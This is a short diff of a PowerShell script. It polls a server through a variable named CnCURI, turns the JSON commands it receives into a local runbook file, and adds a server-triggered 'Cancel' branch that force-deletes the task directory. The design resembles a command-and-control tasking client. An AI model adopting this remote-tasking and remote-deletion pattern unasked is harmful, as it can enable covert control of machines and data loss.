@@ -1,10 +1,10 @@
 $script:name=($MyInvocation.MyCommand.Name).Trim('.ps1')
 
 function CheckWebTasks() {
-	if (!(test-path $TaskDir)) {mkdir  $TaskDir}
+	if (!(test-path $TaskDir)) {mkdir $TaskDir}
 	#Check for published tasks
 	$WebCommand=(Invoke-WebRequest -Method POST -Headers $head -URI $CnCURI -UseBasicParsing).content
-	IF ($WebCommand) {
+
 	#Check for JSON format
 	if ($WebCommand -match '{"') {
 		$CmdList0=($WebCommand | convertfrom-json).psobject.properties | select name,value 
@@ -16,11 +16,12 @@ function CheckWebTasks() {
 			}
 
 	#Create task runbook
-	
+	if ($CmdList[0] -eq 'Cancel') {
+		Remove-Item "$TaskDir\*.*" -force -verbose
+		}
 	$CmdList | out-file $runbook
 	$hash=(Get-FileHash -Algorithm sha1 $runbook).hash
 	return $hash
-	}
 }
 
 write-host "$name loaded..." -ForegroundColor yellow -BackgroundColor black
